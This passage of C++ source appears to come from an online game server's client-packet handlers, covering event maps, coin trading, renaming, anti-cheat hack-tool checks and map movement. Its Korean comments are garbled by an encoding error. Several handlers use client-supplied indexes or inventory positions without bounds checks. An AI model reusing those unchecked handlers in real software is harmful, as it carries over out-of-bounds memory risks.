	LPOBJECTSTRUCT lpObj = &gObj[iIndex];

	EGReqUsePCBangCoupon(iIndex);
}
#endif

#ifdef KANTURU_PROTOCOL_20060705
#include "Kanturu.h"
//----------------------------------------------------------------------------
// CG [0xD1][0x00] Ŭ���̾�Ʈ�� ĭ���� �������� ���� ���� ������ ��û
//----------------------------------------------------------------------------
void CGReqKanturuStateInfo( LPPMSG_REQ_KANTURU_STATE_INFO lpMsg, int iIndex )
{
	if( !CHECK_LIMIT( iIndex, MAX_OBJECT) )
		return;

#ifdef ADD_NEW_NPC_KANTURU_20060612
	g_KanturuEntranceNPC.NotifyEntranceInfo( iIndex );
#endif
}

//----------------------------------------------------------------------------
// CG [0xD1][0x01] Ŭ���̾�Ʈ�� ĭ���� ������ �����ʿ� ���� ��û
//----------------------------------------------------------------------------
void GCReqEnterKanturuBossMap( LPPMSG_REQ_ENTER_KANTURU_BOSS_MAP lpMsg, int iIndex )
{
	if( !CHECK_LIMIT( iIndex, MAX_OBJECT) )
		return;
	
#ifdef ADD_NEW_NPC_KANTURU_20060612	
	g_KanturuEntranceNPC.NotifyResultEnterKanturuBossMap( iIndex );
#endif
}
#endif	// #ifdef KANTURU_PROTOCOL_20060705

#ifdef WHITEANGEL_GET_ITEM_EVENT_20060822
//----------------------------------------------------------------------------
// CG [0xD0][0x01] ȭ��Ʈ���� ������ ���� ��û
//----------------------------------------------------------------------------
void CGReqWhiteAngelGetItem( LPPMSG_REQ_WHITEANGEL_ITEM lpMsg, int iIndex )
{
	if( !CHECK_LIMIT( iIndex, MAX_OBJECT ) )
		return;

	LPOBJECTSTRUCT lpObj = &gObj[iIndex];

	GEReqWhiteAngelGetItem( iIndex );
}
#endif	// WHITEANGEL_GET_ITEM_EVENT_20060822

#ifdef PCBANG_POINT_SYSTEM_20070206		// Recv From Client - ó��
//----------------------------------------------------------------------------
// CG [0xD0][0x05] PC�� ����Ʈ ���� ������ ����/���� ��� ��û
//----------------------------------------------------------------------------
void  CGReqBuyPCBangPointItem( LPPMSG_REQ_CG_BUY_PCBANG_POINT_ITEM lpMsg, int iIndex )
{
	if( lpMsg == NULL )
		return;

	if( !CHECK_LIMIT( iIndex, MAX_OBJECT ) )
		return;

	if( PacketCheckTime( &gObj[iIndex] ) == FALSE ) 
	{
		PMSG_ANS_GC_BUY_PCBANG_POINT_ITEM pResult;
		PHeadSubSetB( ( LPBYTE )&pResult, 0xD1, 0x05, sizeof( pResult ) );
		pResult.btResult = 6;	// ���� ��Ȳ
		pResult.btInvenPos = 0xFF;

		DataSend( iIndex, ( LPBYTE )&pResult, pResult.h.size );
		return;	
	}

	g_PCBangPointSystem.BuyPCBangPointItem( iIndex, lpMsg->btInvenPos );
}

//----------------------------------------------------------------------------
// CG [0xD0][0x06] PC�� ����Ʈ ���� ���� ��û
//----------------------------------------------------------------------------
void CGReqPCBangPointShopOpen( LPPMSG_REQ_PCBANG_POINT_SHOP_OPEN lpMsg, int iIndex )
{
	if( lpMsg == NULL )
		return;

	if( !CHECK_LIMIT( iIndex, MAX_OBJECT ) )
		return;

	g_PCBangPointSystem.PCBangPointShopOpen( iIndex );
}
#endif	// PCBANG_POINT_SYSTEM_20070206

#ifdef THIRD_CHANGEUP_SYSTEM_20070507
//----------------------------------------------------------------------------
// CG [0xD0][0x07] 3�� ���� ����Ʈ - ��������� ���� �߰����� ���� ���� ��û
//----------------------------------------------------------------------------
void CGReqEnterOnWerwolf( LPPMSG_REQ_ENTER_ON_WERWOLF lpMsg, int iIndex )
{
	if( lpMsg == NULL )
		return;

	if( !CHECK_LIMIT( iIndex, MAX_OBJECT ) )
		return;	

	g_QuestInfo.CheckQuestMapEnterOnWerwolf( iIndex );
}

//----------------------------------------------------------------------------
// CG [0xD0][0x08] 3�� ���� ����Ʈ - ������(����)�� ���� �߰����� �Ƚ�ó ���� ��û
//----------------------------------------------------------------------------
void CGReqEnterOnGateKeeper( LPPMSG_REQ_ENTER_ON_GATEKEEPER lpMsg, int iIndex )
{
	if( lpMsg == NULL )
		return;

	if( !CHECK_LIMIT( iIndex, MAX_OBJECT ) )
		return;	

	g_QuestInfo.CheckQuestMapEnterOnGateKeeper( iIndex );
}
#endif	// THIRD_CHANGEUP_SYSTEM_20070507


#ifdef ADD_EVENT_MAP_ILLUSION_TEMPLE_20070328

//----------------------------------------------------------------------------
// CG [0xBF][0x00] ���� ��û
//----------------------------------------------------------------------------
void CGReqEnterIllusionTemple( LPPMSG_REQ_ENTER_ILLUSION_TEMPLE lpMsg, int iIndex )
{
	if (!CHECK_LIMIT(iIndex, MAX_OBJECT))
	{
		LogAdd("return %s %d", __FILE__, __LINE__);
		return;
	}

#ifdef 	MODIFY_ILLUSIONTEMPLE_BUGFIX_2_20070724
	g_IllusionTempleEvent.EnterIllusionTemple(iIndex, lpMsg->btIllusionTempleIdx -1, lpMsg->iItemPos);
#else
	g_IllusionTempleEvent.EnterIllusionTemple(iIndex, lpMsg->btIllusionTempleIdx, lpMsg->iItemPos);
#endif
}

//----------------------------------------------------------------------------
// CG [0xBF][0x02]	ȯ�� ��� ���� �������
//----------------------------------------------------------------------------
void CGIllusionTempleUseMagic( LPPMSG_ILLUSION_TEMPLE_USE_MAGIC lpMsg, int iIndex )
{
	if (!CHECK_LIMIT(iIndex, MAX_OBJECT))
	{
		LogAdd("return %s %d", __FILE__, __LINE__);
		return;
	}

	WORD wTargetIndex = MAKEWORD(lpMsg->btTargetObjIndexL, lpMsg->btTargetObjIndexH);
#ifdef ADD_MASTER_LEVEL_SKILL_SYSTEM_ACTIVE_20080107		// ��ų��ȣ BYTE -> WORD
	g_IllusionTempleEvent.IllusionTempleUseSkill(iIndex, MAKEWORD( lpMsg->MagicNumberL, lpMsg->MagicNumberH ), wTargetIndex, lpMsg->Dis);
#else
	g_IllusionTempleEvent.IllusionTempleUseSkill(iIndex, lpMsg->MagicNumber, wTargetIndex, lpMsg->Dis);
#endif
}

//----------------------------------------------------------------------------
// CG [0xBF][0x05] ȯ�� ������� �¸��� ������ ��û
//----------------------------------------------------------------------------
void CGReqIllusionTempleReward( LPPMSG_ILLUSION_TEMPLE_REQ_REWARD lpMsg, int aIndex )
{
	if (!CHECK_LIMIT(aIndex, MAX_OBJECT))
	{
		LogAdd("return %s %d", __FILE__, __LINE__);
		return;
	}

	g_IllusionTempleEvent.ReqEventReward(aIndex);
}

//----------------------------------------------------------------------------
// GC [0xBF][0x06] ȯ�� ������� ���͸� �׿��� ��� ��ų ����Ʈ
//----------------------------------------------------------------------------
void GCIllusionTempleSkillPoint(int iIndex, BYTE btSkillPoint)
{
	PMSG_ILLUSION_TEMPLE_SKILL_POINT pMsg;

	PHeadSubSetB((LPBYTE)&pMsg, 0xBF, 0x06, sizeof(pMsg));

	pMsg.btSkillPoint = btSkillPoint;

	DataSend(iIndex, (LPBYTE)&pMsg, pMsg.h.size);
}

#endif	// ADD_EVENT_MAP_ILLUSION_TEMPLE_20070328


#ifdef ADD_ITEM_GIVE_NPC_ALAN_20070823
//----------------------------------------------------------------------------
// CG [0xD0][0x09] ������ ���� NPC�ٷ� - ������ ���� ��û ����
//----------------------------------------------------------------------------
void CGReqAlansItem( LPPMSG_REQ_GIVE_ALANS_ITEM lpMsg, int iIndex )
{
	if( lpMsg == NULL )
		return;

	if( !CHECK_LIMIT( iIndex, MAX_OBJECT ) )
		return;	

	GEReqAlansItem( iIndex );
}
#endif

#ifdef ADD_NPC_XMASEVENT_20080930
void CGAnsSnowManMoveGate(LPPMSG_REQ_SNOWMAN_NPC lpMsg, int iIndex)
{
	if( lpMsg == NULL )
		return;
	
	if( !CHECK_LIMIT( iIndex, MAX_OBJECT ) )
		return;	
	
	CGReqSnowManMoveGate(iIndex);
}

#endif

#ifdef ADD_GIFTITEM_XMASEVENT_20081030
//----------------------------------------------------------------------------
// CG [0xD0][0x10] ������ ���� X-MAS SANTA - ������ ���� ��û ����
//----------------------------------------------------------------------------
void CGReqEventItem( LPPMSG_REQ_GIVE_SANTA_ITEM lpMsg, int iIndex )
{
	if( lpMsg == NULL )
		return;
	
	if( !CHECK_LIMIT( iIndex, MAX_OBJECT ) )
		return;	
	
	GEReqEventNPCItem( iIndex, EVENT_XMAS );
}
#endif //ADD_GIFTITEM_XMASEVENT_20081030 




#ifdef UPDATE_CHANGE_CHARACTERNAME_20080410 
//----------------------------------------------------------------------------
// CG [0xF3][0x15] ĳ���͸� ���� Ȯ�ο�û
//----------------------------------------------------------------------------
void CGReqCheckChangeName(LPPMSG_REQ_CHECK_CHAGNE_NAME lpMsg, int aIndex)
{
	// ������ �ȹ��� ���¶�� �����Ų��.
	if( gObj[aIndex].Connected < 2 ) 
	{
		LogAdd(lMsg.Get(476), aIndex, gObj[aIndex].Ip_addr);
		CloseClient ( aIndex );
		return;
	}

	PMSG_ANS_CHECK_CHAGNE_NAME pResult;
	PHeadSubSetB((LPBYTE)&pResult, 0xF3, 0x15, sizeof(pResult));

	if(g_bChangeCharacterName)
	{
		// ���氡������ Ȯ��
		char CharName[MAX_IDSTRING+1];
		CharName[MAX_IDSTRING] = '\0';
		memcpy(CharName, lpMsg->Name, MAX_IDSTRING);

		int seps   = '_';
		char *token;
		token = strchr( CharName, seps );
		if(token != NULL)
		{
			// ����
			pResult.btResult = 1;		
		}
		else
		{
			// ������ �� ����
			pResult.btResult = 0;
		}
	}
	else
	{
		// ������ �� ����
		pResult.btResult = 0;
	}

	memcpy(pResult.Name, lpMsg->Name, MAX_IDSTRING);
	DataSend(aIndex, (LPBYTE)&pResult, pResult.h.size);
}

//----------------------------------------------------------------------------
// CG [0xF3][0x16] ĳ���͸� ���� ��û
//----------------------------------------------------------------------------
void CGChangeName(LPPMSG_CHAGNE_NAME lpMsg, int aIndex)
{
	if(!g_bChangeCharacterName)
	{
		return;
	}

	// ������ �ȹ��� ���¶�� �����Ų��.
	if( gObj[aIndex].Connected < 2 ) 
	{
		LogAdd(lMsg.Get(476), aIndex, gObj[aIndex].Ip_addr);
		CloseClient ( aIndex );
		return;
	}

	SDHP_CHANGE_NAME spMsg;
	PHeadSetB((LPBYTE)&spMsg, 0x16, sizeof(spMsg));
	spMsg.aIndex = aIndex;
	memcpy(spMsg.AccountId, gObj[aIndex].AccountID, MAX_IDSTRING);
	memcpy(spMsg.NewName, lpMsg->NewName, MAX_IDSTRING);
	memcpy(spMsg.OldName, lpMsg->OldName, MAX_IDSTRING);
	
	cDBSMng.Send((char*)&spMsg, spMsg.h.size);
}
#endif	// UPDATE_CHANGE_CHARACTERNAME_20080410

#ifdef EXPERIENCE_SERVER_NPC_STAT_RESET
// �����ʱ�ȭ ��ư ������.
void StatResetBtnClick( LPPMSG_REQ_STAT_RESET lpMsg, int iIndex )
{
	if( gObjIsConnectedGP(iIndex) == FALSE ) 
	{
		LogAddC(LOGC_RED, "error-L3 [%s][%d]", __FILE__,__LINE__);
		return;
	}
	
	gStatReset(iIndex);
}
#endif //EXPERIENCE_SERVER_NPC_STAT_RESET

#ifdef UPDATE_LUCKY_COIN_EVENT_20081029	// ����� ���� �̺�Ʈ �������� �Լ�
//----------------------------------------------------------------------------
// CG[0xBF][0x0b] ��ϵ� ���� ���� ��û
//----------------------------------------------------------------------------
void CGReqGetCoinCount(LPPMSG_REQ_GET_COIN_COUNT lpMsg, int iIndex)
{
	if( !CHECK_LIMIT( iIndex, MAX_OBJECT ) )
		return;

	if( gObj[iIndex].UseEventServer )
		return;

	gObj[iIndex].UseEventServer = TRUE;

	GEReqGetCointCount(iIndex);
}

//----------------------------------------------------------------------------
// GC[0xBF][0x0b] ��ϵ� ���� ���� ���� 
//----------------------------------------------------------------------------
void GCAnsGetCoinCount(int iIndex, int nCoinCnt)
{
	PMSG_ANS_GET_COIN_COUNT pResult;	

	PHeadSubSetB((LPBYTE)&pResult, 0xBF, 0x0b, sizeof(pResult));
	pResult.nCoinCnt = nCoinCnt;
	DataSend(iIndex, (LPBYTE)&pResult, pResult.h.size);

	gObj[iIndex].UseEventServer = FALSE;
}

//----------------------------------------------------------------------------
// CG[0xBF][0x0c] ������� ��û
//----------------------------------------------------------------------------
void CGReqRegeistCoin(LPPMSG_REQ_REGEIST_COIN lpMsg, int iIndex)
{
	int nInventoryPos = -1;

	if( gObj[iIndex].UseEventServer )
		return;

	// ��������� ī�����ڽ� �Ѻ��� ���´�
	gObj[iIndex].bIsChaosMixCompleted	= true;

	gObj[iIndex].UseEventServer = TRUE;

	// �κ��� �ִ� ������ ������ Ȯ��
	for(int nPos=MAX_EQUIPMENT; nPos<MAX_INVENTORY; nPos++)
	{
		if( gObj[iIndex].pInventory[nPos].IsItem() == TRUE )
		{
			if( gObj[iIndex].pInventory[nPos].m_Type == MAKE_ITEMNUM(14, 100) )
			{
				nInventoryPos	= nPos;
				break;
			}
		}
	}

	if ( nInventoryPos == -1)
	{
		// error
		PMSG_ANS_REGEIST_COIN pResult = { 0, };
		PHeadSubSetB((LPBYTE)&pResult, 0xBF, 0x0c, sizeof(pResult));
		
		pResult.btResult = 0;
		DataSend(iIndex, (LPBYTE)&pResult, pResult.h.size);
		
		gObj[iIndex].UseEventServer = FALSE;

		return;
	}

	gObj[iIndex].pInventory[nInventoryPos].m_Durability--;

	// �̺�Ʈ�������� ó���� Ŭ���̾�Ʈ ����� ��� ���ӽ� �������� 0�� ������ ����

	// ��� ��û
	GEReqRegeistCoin(iIndex, nInventoryPos);
}

//----------------------------------------------------------------------------
// GC[0xBF][0x0c] ���� ��� ����
//----------------------------------------------------------------------------
void GCAnsRegeistCoin(int iIndex, BYTE btResult, int nCoinCnt, BYTE btPos)
{
	PMSG_ANS_REGEIST_COIN pResult = { 0 , };
	PHeadSubSetB((LPBYTE)&pResult, 0xBF, 0x0c, sizeof(pResult));

	pResult.btResult	= btResult;
	pResult.nCurCoinCnt = nCoinCnt;

	if( btResult == 1 )
	{
		if(gObj[iIndex].pInventory[btPos].m_Durability  == 0 )
		{
			// ���� ����
			gObjInventoryDeleteItem(iIndex, btPos);
			GCInventoryItemDeleteSend(iIndex, btPos, 1);
		}
		else
		{
			GCItemDurSend(iIndex, btPos, gObj[iIndex].pInventory[btPos].m_Durability, 0);
		}

		LogAddTD("[LuckyCoinEvent] RegistCoin [%s][%s], Coin: %d", gObj[iIndex].AccountID, gObj[iIndex].Name, nCoinCnt);
	}
	else
	{
		gObj[iIndex].pInventory[btPos].m_Durability++;
	}

	DataSend(iIndex, (LPBYTE)&pResult, pResult.h.size);

	gObj[iIndex].UseEventServer = FALSE;
}

typedef BOOL (*LPFUNC_EVENTITEMBOXOPEN)( LPOBJECTSTRUCT, BYTE, UCHAR, UCHAR);

//----------------------------------------------------------------------------
// CG[0xBF][0x0d] ���� ��ȯ ��û
//----------------------------------------------------------------------------
void CGReqTradeCoin(LPPMSG_REQ_TRADE_COIN lpMsg, int iIndex)
{
	if( !CHECK_LIMIT( iIndex, MAX_OBJECT ) )
		return;

	LPOBJECTSTRUCT lpObj = &gObj[iIndex];

	if( !gObjIsConnected( iIndex ) )
		return;

	LPFUNC_EVENTITEMBOXOPEN	pEventItemBoxOpen;

	int nTradeCoinCnt	= lpMsg->nCoinCnt;
	switch (nTradeCoinCnt)
	{
	case 10:
		pEventItemBoxOpen = LuckyCoinEventItemBag10Open;
		break;
	case 20:
		pEventItemBoxOpen = LuckyCoinEventItemBag20Open;
		break;
	case 30:
		pEventItemBoxOpen = LuckyCoinEventItemBag30Open;
		break;
	default:
		GCANSTradeCoin(iIndex, 4);
		return;
		break;
	}

	int nCoinCnt		= 0;
	// ������ ��ȯ�� ������ŭ �ִ��� Ȯ���Ѵ�.
	int nPos;
	for(nPos=MAX_EQUIPMENT; nPos<MAX_INVENTORY; nPos++)
	{
		if( gObj[iIndex].pInventory[nPos].IsItem() == TRUE )
		{
			if( gObj[iIndex].pInventory[nPos].m_Type == MAKE_ITEMNUM(14, 100) )
			{
				nCoinCnt += gObj[iIndex].pInventory[nPos].m_Durability;
			}
		}
	}

	if( nCoinCnt < nTradeCoinCnt)
	{
		// ������ ������
		GCANSTradeCoin(iIndex, 0);
		return;
	}

	// ������ Ȯ��
	if(CheckInventoryEmptySpace_(lpObj, 4, 2) == FALSE)
	{
		// ���� ����
		GCANSTradeCoin(iIndex, 2);
		return;
	}

	// ��������� ī�����ڽ� �Ѻ��� ���´�
	gObj[iIndex].bIsChaosMixCompleted	= true;

	lpObj->ChaosLock = TRUE;
		
	gObjInventoryTrans(lpObj->m_Index);

	// ���� ����
	for(nPos=MAX_EQUIPMENT; nPos<MAX_INVENTORY; nPos++)
	{
		if( gObj[iIndex].pInventory[nPos].IsItem() == TRUE )
		{
			if( gObj[iIndex].pInventory[nPos].m_Type == MAKE_ITEMNUM(14, 100) )
			{
				if(gObj[iIndex].pInventory[nPos].m_Durability < nTradeCoinCnt)
				{
					nTradeCoinCnt -= gObj[iIndex].pInventory[nPos].m_Durability;
					gObjInventoryDeleteItem(iIndex, nPos);
					GCInventoryItemDeleteSend(iIndex, nPos, 1);
				}
				else if(gObj[iIndex].pInventory[nPos].m_Durability == nTradeCoinCnt)
				{
					gObjInventoryDeleteItem(iIndex, nPos);
					GCInventoryItemDeleteSend(iIndex, nPos, 1);
					break;
				}
				else
				{
					gObj[iIndex].pInventory[nPos].m_Durability -= nTradeCoinCnt;
					GCItemDurSend2(lpObj->m_Index, nPos, gObj[iIndex].pInventory[nPos].m_Durability, 0);
					break;
				}
			}
		}
	}
	
	LogAddTD("[LuckyCoinEvent] TradeCoin [%s][%s], TradeCoin: %d", gObj[iIndex].AccountID, gObj[iIndex].Name, nTradeCoinCnt);

	// �ø��� ������ �߱�
	pEventItemBoxOpen(lpObj, ITEMMAKE_INVENTORY_COINITEM, lpObj->X, lpObj->Y);
}

//----------------------------------------------------------------------------
// GC[0xBF][0x0d] ���� ��ȯ ����
//----------------------------------------------------------------------------
void GCANSTradeCoin(int iIndex, BYTE btResult)
{
	if( !CHECK_LIMIT( iIndex, MAX_OBJECT ) )
		return;

	LPOBJECTSTRUCT lpObj = &gObj[iIndex];

	if( !gObjIsConnected( iIndex ) )
		return;

	PMSG_ANS_TRADE_COIN  pResult= { 0 , };
	PHeadSubSetB((LPBYTE)&pResult, 0xBF, 0x0d, sizeof(pResult));

	pResult.btResult = btResult;

	DataSend(iIndex, (LPBYTE)&pResult, pResult.h.size);
}
#endif	// UPDATE_LUCKY_COIN_EVENT_20081029

#ifdef ADD_HACKING_TOOL_BLOCK_20090311
//----------------------------------------------------------------------------
// GC[0x8A] Ư�� ���α׷��� ��� ���θ� ��û�Ѵ�.
//----------------------------------------------------------------------------
void GCReqHacktoolStatistics(LPOBJECTSTRUCT lpObj, char* pchFilename, DWORD dwKey)
{
	if( lpObj == NULL )
	{
		return;
	}
	
	if( lpObj->Type == OBJTYPE_CHARACTER && lpObj->Connected == CSS_GAMEPLAYING )
	{
		g_HackToolBlock.HacktoolStatistics( lpObj, pchFilename );
	}
}

//----------------------------------------------------------------------------
// GC[0x8A] Ư�� ���α׷��� ��� ���� ����� �����Ѵ�.
//----------------------------------------------------------------------------
void CGAnsHacktoolStatistics(LPPMSG_ANS_HACKTOOL_STATISTICS lpMsg, int iIndex)
{
	// Ŭ���̾�Ʈ�� �ش� ���α׷� ��� ���ο� ���� ������ ó���Ѵ�.
	// ���� ��� ���ο� ���� ������ 1���� ��� �ð��� ������.
	LPOBJECTSTRUCT lpObj = &gObj[iIndex];
	
	if( lpObj == NULL )
	{
		return;
	}
	
	if( lpObj->Type == OBJTYPE_CHARACTER && lpObj->Connected == CSS_GAMEPLAYING )
	{
		g_HackToolBlock.SetHacktoolStatistics( lpObj, lpMsg->dwKey, lpMsg->btResult );
	}
}
#endif // ADD_HACKING_TOOL_BLOCK_20090311

#ifdef ADD_MAPMOVE_PROTOCOL_20090327
//----------------------------------------------------------------------------
// CG[0x8E] Ŭ���̾�Ʈ�� �� �̵� ��û
//----------------------------------------------------------------------------
void CGReqMapMove(LPPMSG_REQ_MAPMOVE lpMsg, int iIndex)
{
	// ������� �� �̵� ��û�� Ȯ���Ѵ�.
	LPOBJECTSTRUCT lpObj = &gObj[iIndex];
	PMSG_ANS_MAPMOVE pMsg = {0,};
	int iMapNumber = lpMsg->wMapIndex;

	PHeadSubSetB( (LPBYTE)&pMsg, 0x8E, 0x03, sizeof( pMsg ) );
	pMsg.btResult = MAPMOVE_SUCCESS;

	if( lpObj->Type != OBJTYPE_CHARACTER )
	{
		// error
		// log
		DataSend( iIndex, (LPBYTE)&pMsg, sizeof( pMsg ) );
		return;
	}

	// ������� �̵� �Ұ� ��Ȳ�� Ȯ���Ѵ�.
	// 0. ����ڰ� ������ �� �̵� Ű ���� Ȯ���Ѵ�.
	if( g_bUseMapMoveCheckSum == TRUE )
	{
		if( g_KeyGenerater.CheckKeyValue( &lpObj->m_dwMapMoveKeyValue, lpMsg->dwBlockKey ) == false )
		{
			pMsg.btResult = MAPMOVE_FAILED_CHECKSUM_ERROR;
			DataSend( iIndex, (LPBYTE)&pMsg, sizeof( pMsg ) );
			return;
		}
	}
	else
	{
		g_KeyGenerater.CheckKeyValue( &lpObj->m_dwMapMoveKeyValue, lpMsg->dwBlockKey );
	}

	// 1. �̹� �̵� ���̰ų� �ڷ���Ʈ ������ Ȯ���Ѵ�.
	if( lpObj->Teleport )
	{
		pMsg.btResult = MAPMOVE_FAILED_TELEPORT;
		DataSend( iIndex, (LPBYTE)&pMsg, sizeof( pMsg ) );
		return;
	}

#ifdef PERSONAL_SHOP_20040113
	// 2. ���λ����� �� �������� Ȯ���Ѵ�.
	if( lpObj->m_bPShopOpen == TRUE )
	{
		// ���λ��� ���� : ������ -> �η��þ�
		if( lpObj->MapNumber == MAP_INDEX_CASTLESIEGE 
			&& iMapNumber == MAP_INDEX_RORENCIA )
		{
			pMsg.btResult = MAPMOVE_FAILED_PSHOP_OPEN;
		}
		// ���λ��� ���� : �η��þ� -> ������
		if( lpObj->MapNumber == MAP_INDEX_RORENCIA
			&& iMapNumber == MAP_INDEX_CASTLESIEGE )
		{
			pMsg.btResult = MAPMOVE_FAILED_PSHOP_OPEN;
		}

		if( pMsg.btResult == MAPMOVE_FAILED_PSHOP_OPEN )
		{
			DataSend( iIndex, (LPBYTE)&pMsg, sizeof( pMsg ) );
			return;
		}
	}
#endif

	// 3. �ش� ������ �����ϱ� ���� ��� �����ϴ�.
	// �� �ε����� Ȯ���Ͽ� ���� ���� �������� Ȯ���Ѵ�.
/*
	switch( iMapNumber )
	{
	case MAP_INDEX_ICARUS:					// ��ī�罺
		{
			if( ( lpObj->pInventory[EQUIPMENT_WING].IsItem() == FALSE )
				&& ( lpObj->pInventory[EQUIPMENT_HELPER].m_Type != MAKE_ITEMNUM( 13, 3 ) )
				&& ( lpObj->pInventory[EQUIPMENT_HELPER].m_Type != MAKE_ITEMNUM( 13, 37 ) )
				&& ( lpObj->pInventory[EQUIPMENT_HELPER].m_Type != MAKE_ITEMNUM( 13, 4 ) )
				)
			{
				pMsg.btResult = MAPMOVE_FAILED_NOT_ENOUGH_EQUIP;
			}

			if( ( lpObj->pInventory[EQUIPMENT_RING_LEFT].m_Type == MAKE_ITEMNUM( 13, 10 ) )
				|| ( lpObj->pInventory[EQUIPMENT_RING_LEFT].m_Type == MAKE_ITEMNUM( 13, 39 ) )
				|| ( lpObj->pInventory[EQUIPMENT_RING_LEFT].m_Type == MAKE_ITEMNUM( 13, 40 ) )
				|| ( lpObj->pInventory[EQUIPMENT_RING_LEFT].m_Type == MAKE_ITEMNUM( 13, 41 ) )
				|| ( lpObj->pInventory[EQUIPMENT_RING_RIGHT].m_Type == MAKE_ITEMNUM( 13, 10 ) )
				|| ( lpObj->pInventory[EQUIPMENT_RING_RIGHT].m_Type == MAKE_ITEMNUM( 13, 39 ) )
				|| ( lpObj->pInventory[EQUIPMENT_RING_RIGHT].m_Type == MAKE_ITEMNUM( 13, 40 ) )
				|| ( lpObj->pInventory[EQUIPMENT_RING_RIGHT].m_Type == MAKE_ITEMNUM( 13, 41 ) )
				)
			{
				pMsg.btResult = MAPMOVE_FAILED_WEARING_EQUIP;
			}
		}
		break;
	case MAP_INDEX_ATHLANSE:				// ��Ʋ����
		{
			// ���ϸ��Ƴ� ����Ʈ�� ź ���¿��� �̵��� �� ����.
			if( lpObj->pInventory[EQUIPMENT_HELPER].m_Type == MAKE_ITEMNUM(13,2) 
				|| lpObj->pInventory[EQUIPMENT_HELPER].m_Type == MAKE_ITEMNUM(13,3)
			  )
			{
				pMsg.btResult = MAPMOVE_FAILED_WEARING_EQUIP;
			}
		}
		break;
	case MAP_INDEX_KANTURU_BOSS:			// ĭ���� ���� ��
		{
			if( ( lpObj->pInventory[EQUIPMENT_WING].IsItem() == FALSE )
				&& ( lpObj->pInventory[EQUIPMENT_HELPER].m_Type != MAKE_ITEMNUM( 13, 3 ) )
				&& ( lpObj->pInventory[EQUIPMENT_HELPER].m_Type != MAKE_ITEMNUM( 13, 37 ) )
				&& ( lpObj->pInventory[EQUIPMENT_HELPER].m_Type != MAKE_ITEMNUM( 13, 4 ) )
			  )
			{
				pMsg.btResult = MAPMOVE_FAILED_NOT_ENOUGH_EQUIP;
			}

			if( ( lpObj->pInventory[EQUIPMENT_RING_LEFT].m_Type == MAKE_ITEMNUM( 13, 10 ) )
				|| ( lpObj->pInventory[EQUIPMENT_RING_LEFT].m_Type == MAKE_ITEMNUM( 13, 39 ) )
				|| ( lpObj->pInventory[EQUIPMENT_RING_LEFT].m_Type == MAKE_ITEMNUM( 13, 40 ) )
				|| ( lpObj->pInventory[EQUIPMENT_RING_LEFT].m_Type == MAKE_ITEMNUM( 13, 41 ) )
				|| ( lpObj->pInventory[EQUIPMENT_RING_RIGHT].m_Type == MAKE_ITEMNUM( 13, 10 ) )
				|| ( lpObj->pInventory[EQUIPMENT_RING_RIGHT].m_Type == MAKE_ITEMNUM( 13, 39 ) )
				|| ( lpObj->pInventory[EQUIPMENT_RING_RIGHT].m_Type == MAKE_ITEMNUM( 13, 40 ) )
				|| ( lpObj->pInventory[EQUIPMENT_RING_RIGHT].m_Type == MAKE_ITEMNUM( 13, 41 ) )
			  )
			{
				pMsg.btResult = MAPMOVE_FAILED_WEARING_EQUIP;
			}
		}
		break;
	case MAP_INDEX_KANTURU1:				// ĭ���� ��
	case MAP_INDEX_KANTURU2:
		{
			if( g_iBlockKanturuMapEnter == 1 )
			{
				// ���� �Ұ� ����
				pMsg.btResult = MAPMOVE_FAILED;
			}
		}
		break;
	case MAP_INDEX_CASTLESIEGE:				// ���� ��
	case MAP_INDEX_CASTLEHUNTZONE:
		{
			if( g_iBlockCastleSiegeMapEnter == 1 )
			{
				pMsg.btResult = MAPMOVE_FAILED;
			}
		}
		break;
	case MAP_INDEX_RAKLION_BOSS:			// ��Ŭ���� ���� ��
		{
			// ��Ŭ���� ���� �̺�Ʈ�� ���� �� ���¸� ������ ����Ѵ�.
			if( g_Raklion.GetRaklionState() >= RAKLION_STATE_CLOSE_DOOR )
			{
				pMsg.btResult = MAPMOVE_FAILED_EVENT_END;
			}
		}
		break;
	}
*/

	// 4. ����ڰ� �������̸� �̵� �� �� ����.
	if( lpObj->RegenOk )
	{
		DataSend( iIndex, (LPBYTE)&pMsg, sizeof( pMsg ) );
		return;
	}

#ifdef ADD_HACKING_TOOL_BLOCK_20090311
	// 5 ����ڰ� ��ŷ �� ����ڶ�� �ش� ��ŷ���� ��� ������ ������ �޴´�.
	if( g_HackToolBlock.IsHackedUser( lpObj ) == true )
	{
		// ��ŷ�� ����ڷ� �� �̵��� ��� �Ǿ���.
		pMsg.btResult = MAPMOVE_FAILED_HACKTOOL_BLOCK;
		DataSend( iIndex, (LPBYTE)&pMsg, sizeof( pMsg ) );
		return;
	}
#endif // ADD_HACKING_TOOL_BLOCK_20090311
	
	if( pMsg.btResult != MAPMOVE_SUCCESS )
	{
		DataSend( iIndex, (LPBYTE)&pMsg, sizeof( pMsg ) );
		return;
	}

	DataSend( iIndex, (LPBYTE)&pMsg, sizeof( pMsg ) );

	gMoveCommand.Move( lpObj, iMapNumber );
}

void GCSendMapMoveChecksum(LPOBJECTSTRUCT lpObj)
{
	PMSG_MAPMOVE_CHECKSUM pMsg = {0,};

	pMsg.dwKeyValue		= lpObj->m_dwMapMoveKeyValue;

	PHeadSubSetB( (LPBYTE)&pMsg, 0x8E, 0x01, sizeof( pMsg ) );

	DataSend( lpObj->m_Index, (LPBYTE)&pMsg, sizeof( pMsg ) );
}
#endif // ADD_MAPMOVE_PROTOCOL_20090327